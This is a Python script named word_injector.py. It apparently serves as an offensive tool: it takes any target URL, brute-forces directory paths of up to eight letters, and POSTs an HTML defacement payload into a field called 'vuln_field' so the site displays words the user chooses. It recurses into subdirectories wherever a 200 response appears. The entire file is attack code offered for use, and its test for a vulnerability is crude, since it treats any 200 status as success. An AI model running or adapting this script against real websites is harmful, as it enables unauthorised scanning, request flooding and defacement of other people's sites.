# File: word_injector.py

import requests
import string
import itertools
from colorama import Fore, Style

def generate_combinations(min_length, max_length):
    for length in range(min_length, max_length + 1):
        for combination in itertools.product(string.ascii_lowercase, repeat=length):
            yield ''.join(combination)

def try_exploit(url, payload):
    response = requests.post(url, data=payload)
    return response.status_code == 200

def inject_words(url, words):
    payload = {
        "vuln_field": f"<html><body style='background-color: black; color: darkorange;'><h1>{words}</h1></body></html>"
    }

    directories = []
    min_length = 1
    max_length = 8

    for combination in generate_combinations(min_length, max_length):
        directory = ''.join(combination)
        exploit_url = url + directory
        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Trying {exploit_url}", end="\r")
        if try_exploit(exploit_url, payload):
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Found vulnerable directory: {directory}")
            directories.append(directory)

    if directories:
        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Discovered directories: {directories}")
        answer = input("Do you want to continue and try injecting the words? [y/n]: ")
        if answer.lower() == 'y':
            for directory in directories:
                print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Attempting word injection in {directory}")
                exploit_directory(url, directory, payload)
    else:
        print(f"{Fore.RED}[-]{Style.RESET_ALL} No exploitable directories found.")

def exploit_directory(base_url, directory, payload):
    exploit_url = base_url + directory
    if try_exploit(exploit_url, payload):
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Word injection successful in {directory}!")
    else:
        print(f"{Fore.RED}[-]{Style.RESET_ALL} Word injection failed in {directory}.")
        subdirectories = []
        for combination in generate_combinations(1, 8):
            subdirectory = ''.join(combination)
            subdirectory_url = exploit_url + '/' + subdirectory
            if try_exploit(subdirectory_url, payload):
                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Found vulnerable subdirectory: {subdirectory}")
                subdirectories.append(subdirectory)

        if subdirectories:
            for subdirectory in subdirectories:
                print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Attempting word injection in {directory}/{subdirectory}")
                exploit_directory(exploit_url + '/', subdirectory, payload)
        else:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} No exploitable subdirectories found.")

target_url = input("Enter the target URL: ")
words = input("Enter the words you want the website to say: ")

inject_words(target_url, words)
